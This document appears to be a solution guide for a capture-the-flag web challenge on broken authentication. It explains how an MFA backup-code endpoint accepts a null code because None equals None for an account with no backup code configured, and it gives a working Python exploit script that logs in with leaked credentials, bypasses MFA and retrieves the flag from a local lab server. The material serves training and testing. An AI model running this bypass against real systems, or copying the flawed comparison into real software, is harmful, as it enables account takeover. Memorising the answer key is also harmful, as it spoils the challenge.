# A07 Medium: Solution Guide

### Vulnerability Analysis
1. **Primary Authentication Discovery:**
   - Inspect `/services` to find the SecOps maintenance advisory indicating that the primary administrative account `sysadmin_root` has been provisioned with scheduled token `AutumnSettlement#99`.
2. **Multi-Factor State Machine Inspection:**
   - Log in with `sysadmin_root` / `AutumnSettlement#99`.
   - The server redirects to `/auth/2fa`.
   - The 2FA interface provides a backup recovery option interacting with `/api/v1/auth/verify-backup`.
3. **Type Equivalence & Null Comparison Flaw:**
   - The endpoint retrieves the user's expected backup code via:
     ```python
     expected_code = user_record.get('backup_code')
     ```
   - Because `sysadmin_root` has no backup code pre-configured, `expected_code` evaluates to `None`.
   - In Python, when an incoming JSON payload supplies `{"backup_code": null}` (or empty dictionary `{}`), `submitted_code = data.get('backup_code')` evaluates to `None`.
   - The expression `submitted_code == expected_code` evaluates to `None == None` (`True`), satisfying the condition without requiring a valid code.
4. **Elevation & Flag Retrieval:**
   - The session sets `session['mfa_verified'] = True`.
   - Navigating to `/security/audit-vault` displays the dynamic flag.

---

### Exploit Script
```python
import requests
import re

BASE_URL = "http://127.0.0.1:6020"
session = requests.Session()

# 1. Primary Authentication
login_resp = session.post(f"{BASE_URL}/login", data={
    "username": "sysadmin_root",
    "password": "AutumnSettlement#99"
})
assert login_resp.status_code == 200 or login_resp.history

# 2. MFA Bypass via JSON null-equivalence
mfa_resp = session.post(
    f"{BASE_URL}/api/v1/auth/verify-backup",
    json={"backup_code": None}
)
assert mfa_resp.status_code == 200, f"MFA bypass failed: {mfa_resp.text}"
assert mfa_resp.json().get("success") is True

# 3. Retrieve Flag from Executive Vault
vault_resp = session.get(f"{BASE_URL}/security/audit-vault")
flag = re.search(r"RTSA\{[^}]+\}", vault_resp.text).group(0)
print(f"[+] Dynamic Flag: {flag}")
```
